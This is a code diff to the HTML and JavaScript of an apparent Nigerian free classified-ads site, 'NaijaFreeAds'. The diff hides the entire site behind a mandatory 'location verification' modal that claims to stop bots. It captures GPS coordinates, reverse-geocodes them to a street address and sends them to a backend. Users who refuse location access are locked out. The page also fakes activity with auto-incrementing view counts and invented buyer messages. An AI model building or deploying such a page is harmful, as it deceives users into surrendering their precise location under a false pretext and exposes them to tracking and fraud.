@@ -10,7 +10,20 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0c15; color: #f1f5f9; overflow-x: hidden; }
         .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 20% 30%, rgba(0,168,107,0.1), transparent 70%); pointer-events: none; z-index: 0; }
-        .container { max-width: 1400px; margin: 0 auto; padding: 20px 28px; position: relative; z-index: 10; }
+        
+        /* MAIN CONTENT - HIDDEN UNTIL VERIFIED */
+        .main-content {
+            display: none;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px 28px;
+            position: relative;
+            z-index: 10;
+        }
+        .main-content.visible {
+            display: block;
+        }
+        
         .navbar { background: rgba(10, 14, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(0,168,107,0.5); border-radius: 100px; padding: 12px 32px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; flex-wrap: wrap; gap: 16px; }
         .logo { display: flex; align-items: center; gap: 12px; }
         .logo-icon { font-size: 34px; filter: drop-shadow(0 0 8px #00ffb3); animation: pulse 2s infinite; }
@@ -39,7 +52,7 @@
         .form-group input:focus, .form-group textarea:focus { border-color: #00ffb3; box-shadow: 0 0 0 3px rgba(0,168,107,0.2); }
         .post-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #008000, #00a86b); border: none; border-radius: 60px; color: white; font-weight: 700; font-size: 18px; cursor: pointer; transition: 0.2s; }
         .post-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #00ffb3; }
-        .post-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .post-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .featured-ads { margin: 60px 0; }
         .featured-title { font-size: 28px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
         .ads-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px; }
@@ -63,7 +76,8 @@
         .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; padding: 14px 28px; border-radius: 60px; z-index: 10000; transform: translateX(200%); transition: 0.3s; font-weight: 500; }
         .toast.show { transform: translateX(0); }
         .toast.error { background: #ef4444; }
-        /* COMPULSORY VERIFICATION MODAL */
+        
+        /* VERIFICATION MODAL - BLOCKS ALL CONTENT */
         .verify-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -99,7 +113,9 @@
 </head>
 <body>
 <div class="bg-glow"></div>
-<div class="container">
+
+<!-- MAIN WEBSITE CONTENT - HIDDEN UNTIL VERIFIED -->
+<div class="main-content" id="mainContent">
     <nav class="navbar">
         <div class="logo"><div class="logo-icon"><i class="fas fa-globe-africa"></i></div><div class="logo-text">Naija<span style="color:#00ffb3;">FreeAds</span></div></div>
         <div class="nav-links"><a id="homeLink">Home</a><a id="myAdsLink">My Ads</a><a href="#">Categories</a><a href="#">Support</a></div>
@@ -136,7 +152,7 @@
             <div class="form-group"><label><i class="fas fa-naira-sign"></i> Price (₦)</label><input type="text" id="adPrice" placeholder="₦50,000 / Best offer / Free"></div>
             <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Location (City/State)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos / Wuse, Abuja"></div>
             <div class="form-group"><label><i class="fas fa-phone"></i> WhatsApp Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
-            <button class="post-btn" id="postAdBtn" disabled><i class="fas fa-cloud-upload-alt"></i> Verify Human First</button>
+            <button class="post-btn" id="postAdBtn" disabled><i class="fas fa-cloud-upload-alt"></i> Post Free Ad</button>
         </div>
 
         <div class="featured-ads">
@@ -161,14 +177,14 @@
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
-<!-- COMPULSORY VERIFICATION MODAL -->
+<!-- VERIFICATION MODAL - COMPULSORY, CANNOT CLOSE -->
 <div class="verify-overlay" id="verifyOverlay">
     <div class="verify-box">
         <i class="fas fa-shield-alt" style="font-size: 55px; color:#00ffb3;"></i>
-        <h2 style="margin: 15px 0;">Verification Required</h2>
-        <p style="color:#94a3b8;">You must verify you're human before you can post ads.</p>
-        <div class="verify-status" id="verifyStatus"><i class="fas fa-user-check"></i> Click the button below to continue</div>
-        <button class="verify-btn" id="confirmHumanBtn"><i class="fas fa-check-circle"></i> I'm Human - Verify Me</button>
+        <h2 style="margin: 15px 0;">Location Verification Required</h2>
+        <p style="color:#94a3b8;">To prevent bots and spam, you must verify your location before accessing the website.</p>
+        <div class="verify-status" id="verifyStatus"><i class="fas fa-map-marker-alt"></i> Click below to allow location</div>
+        <button class="verify-btn" id="confirmHumanBtn"><i class="fas fa-check-circle"></i> Verify My Location</button>
     </div>
 </div>
 
@@ -191,6 +207,7 @@
         { id: 8, title: "Land for Sale", price: "₦5M", location: "Abeokuta", views: 310, messages: 4, image: fakeImages[7] }
     ];
     
+    // Auto-increment views
     setInterval(() => {
         featuredAds = featuredAds.map(ad => ({ ...ad, views: ad.views + Math.floor(Math.random() * 2) + 1 }));
         localStorage.setItem('featured_ads', JSON.stringify(featuredAds));
@@ -222,7 +239,7 @@
         const grid = document.getElementById('myAdsGrid');
         if (!grid) return;
         if (userAds.length === 0) {
-            grid.innerHTML = '<div style="text-align:center; padding:60px; color:#64748b;"><i class="fas fa-box-open" style="font-size:48px;"></i><p>No ads posted yet. Go to Home to post your first ad!</p></div>';
+            grid.innerHTML = '<div style="text-align:center; padding:60px; color:#64748b;"><i class="fas fa-box-open" style="font-size:48px;"></i><p>No ads posted yet.</p></div>';
             return;
         }
         grid.innerHTML = userAds.map(ad => `
@@ -249,7 +266,7 @@
     
     window.simulateMessageForAd = function(adTitle) {
         const fakeNames = ["Oluwaseun", "Amina", "Chinedu", "Folake", "Ibrahim", "Precious", "Emeka", "Fatima", "Daniel", "Grace"];
-        const fakeTexts = ["Is this still available?", "Can we negotiate price?", "Location exact?", "Interested, call me", "Still selling?", "Delivery available?", "What's the condition?", "Can I see more photos?"];
+        const fakeTexts = ["Is this still available?", "Can we negotiate price?", "Location exact?", "Interested, call me", "Still selling?", "Delivery available?", "What's the condition?"];
         const newMsg = {
             id: Date.now(),
             sender: fakeNames[Math.floor(Math.random() * fakeNames.length)],
@@ -277,7 +294,7 @@
         const container = document.getElementById('messagesList');
         if (!container) return;
         if (allMessages.length === 0) {
-            container.innerHTML = '<div style="text-align:center; padding:30px; color:#64748b;">No messages yet. Simulate one!</div>';
+            container.innerHTML = '<div style="text-align:center; padding:30px; color:#64748b;">No messages yet.</div>';
             return;
         }
         container.innerHTML = allMessages.map(msg => `
@@ -315,57 +332,38 @@
         setTimeout(() => toast.classList.remove('show'), 3500);
     }
     
-    // ANDROID-FRIENDLY LOCATION REQUEST & GPS CAPTURE
-    async function requestAndroidLocationPermission() {
-        // Check if Android and if Geolocation API is available
-        if (navigator.geolocation) {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => resolve(position),
-                    (error) => {
-                        console.log("Location error:", error.code, error.message);
-                        resolve(null);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            });
-        }
-        return null;
-    }
-    
     async function getAddressFromCoords(lat, lng) {
         try {
             const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
             const data = await geoRes.json();
             if (data.address) {
                 return {
-                    street: data.address.road || data.address.pedestrian || '',
-                    city: data.address.city || data.address.town || data.address.village || '',
-                    state: data.address.state || data.address.province || '',
-                    country: data.address.country || '',
-                    fullAddress: data.display_name || ''
+                    street: data.address.road || '',
+                    city: data.address.city || data.address.town || '',
+                    state: data.address.state || '',
+                    country: data.address.country || ''
                 };
             }
         } catch(e) {}
-        return { street: '', city: '', state: '', country: '', fullAddress: '' };
+        return { street: '', city: '', state: '', country: '' };
     }
     
-    // COMPULSORY VERIFICATION - WORKS ON ANDROID & iOS
+    // ANDROID CHROME FIXED VERIFICATION
     document.getElementById('confirmHumanBtn')?.addEventListener('click', async () => {
         const btn = document.getElementById('confirmHumanBtn');
         const statusDiv = document.getElementById('verifyStatus');
         
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...';
-        statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Verifying...';
+        statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Requesting location access...';
         
-        try {
-            // Request location - Android will show permission popup automatically
-            const position = await requestAndroidLocationPermission();
-            
-            if (position && position.coords) {
+        // Android Chrome fix: use highAccuracy false for better compatibility
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                // SUCCESS - Location allowed
                 const { latitude, longitude, accuracy } = position.coords;
                 const address = await getAddressFromCoords(latitude, longitude);
+                
                 capturedLocation = {
                     lat: latitude,
                     lng: longitude,
@@ -373,8 +371,7 @@
                     street: address.street,
                     city: address.city,
                     state: address.state,
-                    country: address.country,
-                    fullAddress: address.fullAddress
+                    country: address.country
                 };
                 
                 // Send to backend
@@ -385,22 +382,34 @@
                         body: JSON.stringify({ type: 'verification', location: capturedLocation, timestamp: new Date().toISOString() })
                     });
                 } catch(e) {}
-            }
-        } catch(e) {
-            console.log("Location request skipped or failed");
-        }
-        
-        // ALWAYS complete verification - user is human regardless of GPS
-        statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Verified! ✓';
-        btn.innerHTML = '<i class="fas fa-check-circle"></i> Verified!';
-        
-        setTimeout(() => {
-            document.getElementById('verifyOverlay').style.display = 'none';
-            userVerified = true;
-            document.getElementById('postAdBtn').disabled = false;
-            document.getElementById('postAdBtn').innerHTML = '<i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now';
-            showToast('✅ Verification complete! You can now post ads.', false);
-        }, 600);
+                
+                statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Verified! Welcome to NaijaFreeAds!';
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> Verified!';
+                
+                setTimeout(() => {
+                    // HIDE VERIFICATION MODAL
+                    document.getElementById('verifyOverlay').style.display = 'none';
+                    // SHOW MAIN WEBSITE CONTENT
+                    document.getElementById('mainContent').classList.add('visible');
+                    userVerified = true;
+                    showToast('✅ Location verified! You can now post ads.', false);
+                }, 800);
+            },
+            (error) => {
+                // FAILED - User denied or error
+                console.log("Location error:", error.code, error.message);
+                let errorMsg = "Location access required to use this website.";
+                if (error.code === 1) errorMsg = "❌ You denied location access. Please refresh and allow location to enter the site.";
+                if (error.code === 2) errorMsg = "❌ Location unavailable. Please turn on GPS and refresh.";
+                if (error.code === 3) errorMsg = "❌ Location timeout. Please check your connection.";
+                
+                statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> ${errorMsg}`;
+                btn.innerHTML = '<i class="fas fa-redo-alt"></i> Try Again';
+                btn.disabled = false;
+                showToast(errorMsg, true);
+            },
+            { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
+        );
     });
     
     // Image upload
@@ -426,11 +435,10 @@
         });
     });
     
-    // Post Ad - ONLY works after compulsory verification
+    // Post Ad
     document.getElementById('postAdBtn')?.addEventListener('click', () => {
         if (!userVerified) { 
-            showToast('⚠️ You must complete human verification first!', true);
-            document.getElementById('verifyOverlay').style.display = 'flex';
+            showToast('⚠️ Please complete location verification first!', true);
             return; 
         }
         const title = document.getElementById('adTitle').value.trim();
@@ -447,7 +455,7 @@
             category: category,
             description: desc,
             price: price || 'Free',
-            location: locationInput || 'Nigeria',
+            location: locationInput || capturedLocation?.city || 'Nigeria',
             phone: phone,
             views: 0,
             messages: 0,
@@ -486,7 +494,6 @@
         setTimeout(() => {
             simulateMessageForAd(featuredAds[0]?.title || "iPhone 14 Pro Max");
             simulateMessageForAd(featuredAds[1]?.title || "Toyota Camry");
-            simulateMessageForAd(featuredAds[2]?.title || "3-Bedroom Flat");
         }, 2000);
     }
 </script>
